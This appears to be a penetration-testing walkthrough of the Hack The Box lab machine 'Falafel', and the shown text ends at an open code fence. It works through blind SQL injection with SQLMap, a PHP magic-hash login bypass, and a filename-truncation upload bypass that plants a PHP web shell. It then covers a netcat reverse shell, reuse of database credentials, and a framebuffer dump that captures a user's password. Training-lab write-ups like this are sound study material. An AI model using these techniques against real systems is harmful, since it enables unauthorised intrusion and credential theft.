# Falafel Writeup w/o Metasploit

![](https://miro.medium.com/max/590/1*EIDO4PqAnyHSQqESi6PUsQ.png)

## Reconnaissance <a id="2619"></a>

Run the [nmapAutomato](https://github.com/rkhal101/nmapAutomator)r script to enumerate open ports and services running on those ports.

```text
nmapAutomator.sh 10.10.10.73 All
```

* **All**: Runs all the scans consecutively.

We get back the following result.

```text
Running all scans on 10.10.10.73Host is likely running Linux---------------------Starting Nmap Quick Scan---------------------Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-31 00:20 EST
Nmap scan report for 10.10.10.73
Host is up (0.080s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  httpNmap done: 1 IP address (1 host up) scanned in 2.56 seconds
---------------------Starting Nmap Basic Scan---------------------Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-31 00:20 EST
Nmap scan report for 10.10.10.73
Host is up (0.088s latency).PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:                                                                                                                                                                 
|   2048 36:c0:0a:26:43:f8:ce:a8:2c:0d:19:21:10:a6:a8:e7 (RSA)                                                                                                                 
|   256 cb:20:fd:ff:a8:80:f2:a2:4b:2b:bb:e1:76:98:d0:fb (ECDSA)                                                                                                                
|_  256 c4:79:2b:b6:a9:b7:17:4c:07:40:f3:e5:7c:1a:e9:dd (ED25519)                                                                                                              
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))                                                                                                                            
| http-robots.txt: 1 disallowed entry                                                                                                                                          
|_/*.txt                                                                                                                                                                       
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Falafel Lovers
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
....Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.05 seconds----------------------Starting Nmap UDP Scan----------------------
                                                                                                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-31 00:21 EST
Warning: 10.10.10.73 giving up on port because retransmission cap hit (1).
Nmap scan report for 10.10.10.73
Host is up (0.055s latency).
All 1000 scanned ports on 10.10.10.73 are open|filtered (975) or closed (25)Nmap done: 1 IP address (1 host up) scanned in 19.90 seconds---------------------Starting Nmap Full Scan----------------------
                                                                                                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-31 00:21 EST
Initiating Parallel DNS resolution of 1 host. at 00:21
Completed Parallel DNS resolution of 1 host. at 00:21, 0.01s elapsed
Initiating SYN Stealth Scan at 00:21
Scanning 10.10.10.73 [65535 ports]
.....
Nmap scan report for 10.10.10.73
Host is up (0.065s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  httpRead data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 132.81 seconds
           Raw packets sent: 66244 (2.915MB) | Rcvd: 66223 (2.668MB)No new ports---------------------Starting Nmap Vulns Scan---------------------
                                                                                                                                                                               
Running CVE scan on basic ports
                                                                                                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-31 00:23 EST
/usr/local/bin/nmapAutomator.sh: line 226:  1867 Segmentation fault      $nmapType -sV --script vulners --script-args mincvss=7.0 -p$(echo "${ports}") -oN nmap/CVEs_"$1".nmap "$1"Running Vuln scan on basic ports
                                                                                                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-31 00:23 EST
Nmap scan report for 10.10.10.73
Host is up (0.045s latency).PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 328.68 seconds---------------------Recon Recommendations----------------------Web Servers Recon:
                                                                                                                                                                               
gobuster dir -w /usr/share/wordlists/dirb/common.txt -l -t 30 -e -k -x .html,.php -u http://10.10.10.73:80 -o recon/gobuster_10.10.10.73_80.txt
nikto -host 10.10.10.73:80 | tee recon/nikto_10.10.10.73_80.txtWhich commands would you like to run?                                                                                                                                          
All (Default), gobuster, nikto, Skip <!>Running Default in (1) s:---------------------Running Recon Commands----------------------Starting gobuster scan
                                                                                                                                                                               
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.73:80
[+] Threads:        30
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Show length:    true
[+] Extensions:     html,php
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2020/01/31 00:29:43 Starting gobuster
===============================================================
http://10.10.10.73:80/.hta (Status: 403) [Size: 290]
http://10.10.10.73:80/.hta.php (Status: 403) [Size: 294]
http://10.10.10.73:80/.hta.html (Status: 403) [Size: 295]
http://10.10.10.73:80/.htpasswd (Status: 403) [Size: 295]
http://10.10.10.73:80/.htpasswd.html (Status: 403) [Size: 300]
http://10.10.10.73:80/.htpasswd.php (Status: 403) [Size: 299]
http://10.10.10.73:80/.htaccess (Status: 403) [Size: 295]
http://10.10.10.73:80/.htaccess.html (Status: 403) [Size: 300]
http://10.10.10.73:80/.htaccess.php (Status: 403) [Size: 299]
http://10.10.10.73:80/assets (Status: 301) [Size: 311]
http://10.10.10.73:80/css (Status: 301) [Size: 308]
http://10.10.10.73:80/footer.php (Status: 200) [Size: 0]
http://10.10.10.73:80/header.php (Status: 200) [Size: 288]
http://10.10.10.73:80/images (Status: 301) [Size: 311]
http://10.10.10.73:80/index.php (Status: 200) [Size: 7203]
http://10.10.10.73:80/index.php (Status: 200) [Size: 7203]
http://10.10.10.73:80/js (Status: 301) [Size: 307]
http://10.10.10.73:80/login.php (Status: 200) [Size: 7063]
http://10.10.10.73:80/logout.php (Status: 302) [Size: 0]
http://10.10.10.73:80/profile.php (Status: 302) [Size: 9787]
http://10.10.10.73:80/robots.txt (Status: 200) [Size: 30]
http://10.10.10.73:80/server-status (Status: 403) [Size: 299]
http://10.10.10.73:80/style.php (Status: 200) [Size: 6174]
http://10.10.10.73:80/upload.php (Status: 302) [Size: 0]
http://10.10.10.73:80/uploads (Status: 301) [Size: 312]
===============================================================
2020/01/31 00:30:23 Finished
===============================================================Finished gobuster scan
                                                                                                                                                                               
=========================
                                                                                                                                                                               
Starting nikto scan
                                                                                                                                                                               
- Nikto v2.1.6
--------------------------------------------------------------------
+ Target IP:          10.10.10.73
+ Target Hostname:    10.10.10.73
+ Target Port:        80
+ Start Time:         2020-01-31 00:30:25 (GMT-5)
--------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ Cookie PHPSESSID created without the httponly flag
+ OSVDB-3233: /icons/README: Apache default file found.
+ /login.php: Admin login page/section found.
+ 7866 requests: 0 error(s) and 8 item(s) reported on remote host
+ End Time:           2020-01-31 00:36:25 (GMT-5) (360 seconds)
--------------------------------------------------------------------
+ 1 host(s) testedFinished nikto scan
                                                                                                                                                                               
=========================
                                                                                                                                                                                                                                                                                                                                              
                                                                                                                                                                               
---------------------Finished all Nmap scans---------------------Completed in 15 minute(s) and 39 second(s)
```

We have two ports open.

* **Port 22:** running OpenSSH 7.2p2
* **Port 80:** running Apache httpd 2.4.18

Before we move on to enumeration, let’s make some mental notes about the scan results.

* The OpenSSH version that is running on port 22 is not associated with any critical vulnerabilities, so it’s unlikely that we gain initial access through this port, unless we find credentials.
* The nmap and gobuster scans found a _robots.txt_ file that disallows web robots from crawling files that have the extension _.txt_, so we’ll have to run another gobuster scan to enumerate files with this extension.

## Enumeration <a id="2fb9"></a>

Visit the application in the browser.

![](https://miro.medium.com/max/1361/1*xEhDWV5bEe9Y2RbuoD_qwQ.png)

View page source. We don’t find anything useful. Before we click on the login button, let’s run a gobuster scan to enumerate files with the extension _.txt_. Maybe we’ll find credentials there.

```text
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -l -t 30 -x .txt -u http://10.10.10.73:80
```

* **dir:** directory mode
* **-w:** wordlist
* **-l:** include the length of the body in the output
* **-t:** number of concurrent threads
* **-x:** file extensions to search for
* **-u:** the target URL

We get back the following result.

```text
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.73:80
[+] Threads:        30
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Show length:    true
[+] Extensions:     txt
[+] Timeout:        10s
===============================================================
2020/01/31 00:49:32 Starting gobuster
===============================================================
/images (Status: 301) [Size: 311]
/uploads (Status: 301) [Size: 312]
/assets (Status: 301) [Size: 311]
/css (Status: 301) [Size: 308]
/js (Status: 301) [Size: 307]
/robots.txt (Status: 200) [Size: 30]
/cyberlaw.txt (Status: 200) [Size: 804]
/server-status (Status: 403) [Size: 299]
```

View the content of _cyberlaw.txt_.

![](https://miro.medium.com/max/1268/1*vh3RVwud7jOcw9NkFZEZDA.png)

This email pretty much lays down a roadmap on how to gain initial access on the box. The fact that the user was able to log into the admin account without a password means that it is vulnerable to a SQL injection. The email does mention that there are protections put in place, so we’ll have to play around with SQLMap to bypass these protections. Once we do login, there is an image upload functionality that will probably allow us to execute code on the box.

Let’s start off with viewing the Login page.

![](https://miro.medium.com/max/1337/1*DOUNG7AJZffvbxARIjGPrg.png)

Whenever I see a custom login page, I perform the following steps in order.

1. Try common credentials such as _admin/admin_, _admin/password_ and _falafel/falafel_.
2. Determine if you can enumerate usernames based on a verbose error message.
3. Manually test for SQL injection. If it requires a more complex SQL injection, run SQLMap on it.
4. If all fails, run hydra to brute force credentials.

None of the common credentials worked. However, while testing for common credentials we did notice that every time we put the username “_admin_”, we get the error “_Wrong identification: admin_”, whereas, any other random username gives the error _“Try again.._”. Therefore, we know for sure that the username “_admin_” is an existing username of the application. This is known as a verbose error message that allows us to enumerate valid usernames.

Next, let’s test for SQL injection. We’ll start off with the following simple payload in the username.

```text
' or 1=1
```

We get the “Try again..” error. Next, try the following payload.

```text
admin' --
```

We get the “Wrong identification: admin” error. Interesting. The payload is definitely interfering with the SQL query. However, this seems to be a case of [blind SQL injection](https://owasp.org/www-community/attacks/Blind_SQL_Injection), where exploiting this vulnerability won’t allow us to automatically bypass authentication. Instead we’ll have to ask the database a series of true and false questions to enumerate information such as usernames and passwords. This type of injection is difficult to exploit even with a tool such as SQLMap, and we’ll demonstrate that below.

To run SQLMap on an application, first intercept the login request in Burp and save it in the file _login-request.txt_.

```text
POST /login.php HTTP/1.1
Host: 10.10.10.73
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.73/login.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 32
Connection: close
Cookie: PHPSESSID=h15rlqgk2b4on7lkkqkca22692
Upgrade-Insecure-Requests: 1username=admin&password=password
```

Then run SQLMap on the request.

```text
sqlmap -level=5 -risk=3 -p username -r login-request.txt
```

* **-level:** level of tests to perform \(1–5, default 1\)
* **-risk:** risk of tests to perform \(1–3, default 1\)
* **-p:** testable parameter\(s\)
* **-r:** load HTTP request from a file

We get back the following result telling us that with the configuration setting we used, the login form is not vulnerable to SQL injection.

```text
[20:16:43] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
```

However, based on our manual testing, we know for sure that the login page is vulnerable to SQL injection. So, let’s tweak the SQLMap configuration.

```text
sqlmap -level=5 -risk=3 -p username --string="Wrong identification" -r login-request.txt
```

* **— string:** String to match when query is evaluated to True

It discovers that the username parameter is vulnerable!

![](https://miro.medium.com/max/1235/1*1VFinMHgBqOhmh6nDBGk9Q.png)

Let’s configure SQLMap to dump all the database table entries.

```text
sqlmap -level=5 -risk=3 -p username --string="Wrong identification" --dump --batch -r login-request.txt
```

* **— dump:** Dump DBMS database table entries
* **— batch:** Never ask for user input, use the default behaviour

We get back the following result.

![](https://miro.medium.com/max/1403/1*Fnhoa_G1crQUns9Be5phhw.png)

SQLMap found two users: _admin_ and _chris_ and it cracked _chris’s_ password.

**Note:** SQLMap is NOT allowed on the OSCP exam. The Extra Content section at the end of this blog explains how to manually exploit this vulnerability without having to use an automated tool.

Let’s log into Chris’s account.

![](https://miro.medium.com/max/1233/1*1IMQRtMXQCEu-3lydmW97A.png)

There’s no upload functionality on his account but it does make mention of juggling. Since this is a php application and we saw in the SQLMap result that the admin password starts with the string “_0e_”, they’re probably hinting on an attack that involves type juggling.

PHP is loosely typed, so it does not require you to declare a variable type when declaring a variable. Therefore, when evaluating a variable it can automatically perform a type conversion on the variable, converting it from one type to another. For example, the admin’s password “_0e462096931906507119562988736854_” is automatically converted to a float and evaluated as 0 \(0 x 10^\(462…\). You can test this out in the terminal.

```text
root@kali:~/Desktop/htb/falafel# php -a
Interactive mode enabledphp > print(0e462096931906507119562988736854);
0
```

In this specific scenario, this poses a security issue because any password that has an md5 hash that starts with the string “0e” will authenticate us to the admin account. A quick google search on “0e md5 hash”, [gives us several such strings](https://news.ycombinator.com/item?id=9484757):

```text
$ echo -n 240610708 | md5sum
0e462097431906509019562988736854  -$ echo -n QNKCDZO | md5sum
0e830400451993494058024219903391  -$ echo -n aabg7XSs | md5sum
0e087386482136013740957780965295  -
```

When we enter any one of the above strings in the login form, it will get sent to the backend, hashed and compared with the hash of the admin password. Since both the hash of the admin password and the hash of the above password are equal to 0, the application assumes we have the correct admin password and authenticates us as admin. Pretty cool, huh?

Let’s use the “QNKCDZO” string as the password and authenticate into the admin account.

![](https://miro.medium.com/max/1405/1*5n64Ct9vpGhaZkf0gu8nzQ.png)

We’re in!

## Initial Foothold <a id="220b"></a>

Let’s test out the image upload functionality by uploading a valid image. Save the image _test.png_ on your attack machine and start up a python server in the directory that the image resides in.

```text
python -m SimpleHTTPServer 5555
```

Upload the image in the application.

![](https://miro.medium.com/max/889/1*u8QmH5-qsSoTE2hd3zbVjw.png)

View page source to see the output of the application \(client side scripts don’t seem to be functioning properly\).

![](https://miro.medium.com/max/1339/1*BUSirQR7XykwWAC_9AQdGw.png)

The image was successfully uploaded in the above location. So not only do we have a place to upload files, but we also know the location where we can call and execute these files. Let’s try uploading a PHP file \(_test.php_\).

```text
GIF87a                                                                                                                                                                         
<?php system($_GET['cmd']); ?>
```

We get a Bad extension error. Next, let’s try _test.php.png_. The upload is successful but when we call the file, it views it as a PNG file that contains errors. After that, I tried a couple of other things that didn’t work, so I decided to instead enumerate more. If you click on the Profile link, you get the following page.

![](https://miro.medium.com/max/1213/1*qroxwqP9tU1Lu-oLBoWelg.png)

The quote “Know your limits” gives me the hint that maybe there is a character limit on the file name we upload, although there isn’t one on the client side. So let’s google the maximum character limit for a filename on linux.

![](https://miro.medium.com/max/652/1*x8t6kHw4eFPBTmAZB1SP2Q.png)

255 characters. Let’s generate a string of 255 letters.

```text
root@kali:~/Desktop/htb/falafel# python3 -c 'print("a" * 255);'
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
```

Then remove the last four characters and add a “.png” extension.

```text
root@kali:~/Desktop/htb/falafel# touch aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.png
```

Now we have a file that has a filename with the maximum allowed number of characters on Linux. Upload the file on the application and view the error we get.

```text
<h1>Upload via url:</h1>  
<div>  
<h3>Upload Succsesful!</h3> 
<div>  
<h4>Output:</h4>  
<pre>CMD: cd /var/www/html/uploads/0202-1826_53228651d3b26695; wget 'http://10.10.14.12:5555/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.png'</pre>  
        
<pre>The name is too long, 255 chars total.
Trying to shorten...
New name is aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.
--2020-02-02 18:26:28--  http://10.10.14.12:5555/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.png
Connecting to 10.10.14.12:5555... connected.
HTTP request sent, awaiting response... 200 OK
Length: 0 [image/png]
Saving to: 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
0K                                                        0.00 =0s
2020-02-02 18:26:28 (0.00 B/s) - 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa' saved [0/0]
</pre>
```

The name is too long for the application, so the application truncated the filename to the maximum length it can accept. Let’s see what that length is.

```text
ali:~/Desktop/htb/falafel# echo aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa | wc -c
237
```

Alright, so the application only accepts a filename with 237 characters. Anything beyond that gets truncated. So what we’ll do is create a filename of length 237 that ends with the extension “_.php_”, then add the extension “_.png_” to the file. Since this exceeds the file limit, the “_.png_” extension will get truncated, and we’ll be left with our php file.

```text
root@kali:~/Desktop/htb/falafel# mv test.php aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.php.png
```

Upload the file and view the output message.

```text
<h1>Upload via url:</h1>  
<div>  
<h3>Upload Succsesful!</h3> 
<div>  
<h4>Output:</h4>  
<pre>CMD: cd /var/www/html/uploads/0202-1852_127546ec6e8c49a3; wget 'http://10.10.14.12:5555/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.php.png'</pre>  
        
<pre>The name is too long, 240 chars total.
Trying to shorten...
New name is aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.php.
--2020-02-02 18:52:45--  http://10.10.14.12:5555/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.php.png
Connecting to 10.10.14.12:5555... connected.
HTTP request sent, awaiting response... 200 OK
Length: 208 [image/png]
Saving to: 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.php'
0K                                                       100% 29.9M=0s2020-02-02 18:52:45 (29.9 MB/s) - 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.php' saved [208/208]
</pre>
</div>
```

This looks good, let’s call our saved php script with the “cmd” parameter.

```text
http://10.10.10.73/uploads/0202-1852_127546ec6e8c49a3/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.php?cmd=whoami
```

We get the following result.

![](https://miro.medium.com/max/1125/1*ErlGcMN0FHjZ3Ec1Uj6mwg.png)

We have code execution! Intercept the request in Burp and send it to Repeater. Then visit [pentestmonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) and get a bash reverse shell to add in the _cmd_ parameter. Don’t forget to URL encode it \(Ctrl + U\).

![](https://miro.medium.com/max/693/1*YReF6__8AI9VqillMvHiHg.png)

Set up a listener on the attack machine to receive the reverse shell.

```text
nc -nlvp 1234
```

Send the request.

![](https://miro.medium.com/max/984/1*ge3lpKFz-S4Dpa5jRFqhEA.png)

We get a shell! Let’s upgrade it to a better shell.

```text
python -c 'import pty; pty.spawn("/bin/bash")'
```

This gives us a partially interactive bash shell. To get a fully interactive shell, background the session \(CTRL+ Z\) and run the following in your terminal which tells your terminal to pass keyboard shortcuts to the shell.

```text
stty raw -echo
```

Once that is done, run the command “fg” to bring netcat back to the foreground. Then use the following command to give the shell the ability to clear the screen.

```text
export TERM=xterm
```

Unfortunately, we’re running as the web daemon user _www-data_ and we don’t have privileges to view the _user.txt_ flag.

The first thing I usually do when I get initial access through a web application, is look for credentials that the application is using. In the _/var/www/html_ directory, we find credentials in the _connection.php_ file.

```text
www-data@falafel:/var/www/html$ cat connection.php 
<?php
   define('DB_SERVER', 'localhost:3306');
   define('DB_USERNAME', 'moshe');
   define('DB_PASSWORD', 'falafelIsReallyTasty');
   define('DB_DATABASE', 'falafel');
   $db = mysqli_connect(DB_SERVER,DB_USERNAME,DB_PASSWORD,DB_DATABASE);
   // Check connection
   if (mysqli_connect_errno())
   {
      echo "Failed to connect to MySQL: " . mysqli_connect_error();
   }
?>
```

Most users reuse their passwords, so let’s try and su into _moshe_’s account using his database password.

```text
www-data@falafel:/var/www/html$ su moshe
Password:
moshe@falafel:/var/www/html$
```

We’re in! Grab the _user.txt_ flag.

![](https://miro.medium.com/max/601/1*rP-BRvro06nEYYJ15ravJw.png)

Let’s look for ways to escalate our privileges.

## Privilege Escalation <a id="5337"></a>

Run the _id_ command to view the real and effective user ids for the _moshe_ user.

```text
moshe@falafel:~$ id
uid=1001(moshe) gid=1001(moshe) groups=1001(moshe),4(adm),8(mail),9(news),22(voice),25(floppy),29(audio),44(video),60(games)
```

The user is part of the group _video_, which can be used locally to give a set of users access to video devices such as the frame buffer. The output to screen is stored within the [frame buffer](https://www.kernel.org/doc/Documentation/fb/framebuffer.txt), which can be dumped to disk and converted to an image. This requires a user to be physically logged into the system.

To view who is logged into the system, we can use the _w_ command.

```text
moshe@falafel:~$ w
 06:42:18 up 2 days, 10:52,  2 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM     LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1              Thu19    2days  0.04s  0.04s -bash
```

The _yossi_ user has a TTY connection which means a direct connection to the computer, versus a PTS connection which are SSH and telnet connections. Let’s grab the frame buffer content from _/dev/fb0_ and save it in _/tmp_.

```text
cp /dev/fb0 /tmp/fb0.raw
```

Then, run the following command to get the width of the screen.

```text
moshe@falafel:/dev$ cat /sys/class/graphics/fb0/virtual_size | cut -d, -f1
1176
```

Run the following command to get the height of the screen.

```text
moshe@falafel:/dev$ cat /sys/class/graphics/fb0/virtual_size | cut -d, -f2
885
```

Then on the attack machine download _fb0.raw_.

```text
scp moshe@10.10.10.73:/tmp/fb0.raw .
```

Download the following script and save it in the file [raw2png](https://reboare.gitbooks.io/booj-security/content/general-linux/privilege-escalation.html).

```text
#!/usr/bin/perl -w

$w = shift || 240;
$h = shift || 320;
$pixels = $w * $h;

open OUT, "|pnmtopng" or die "Can't pipe pnmtopng: $!\n";

printf OUT "P6%d %d\n255\n", $w, $h;

while ((read STDIN, $raw, 2) and $pixels--) {
   $short = unpack('S', $raw);
   print OUT pack("C3",
      ($short & 0xf800) >> 8,
      ($short & 0x7e0) >> 3,
      ($short & 0x1f) << 3);
}

close OUT;
```

The _pnmtopng_ package is not installed by default on kali, so you might need to install it using the following command.

```text
apt-get install pnmtopng
```

Run the script to convert _fb0.raw_ to a png image.

```text
./raw2png 1176 885 < fb0.raw > fb0.png
```

Open up the image.

![](https://miro.medium.com/max/661/1*j0XA1HTOcU8Ljbg6g5klXw.png)

We got lucky! It looks like we grabbed the screen where the _yossi_ user was changing his password to ‘_MoshePlzStopHackingMe!_’. Let’s try and SSH into _yossi’s_ account using this password.

```text
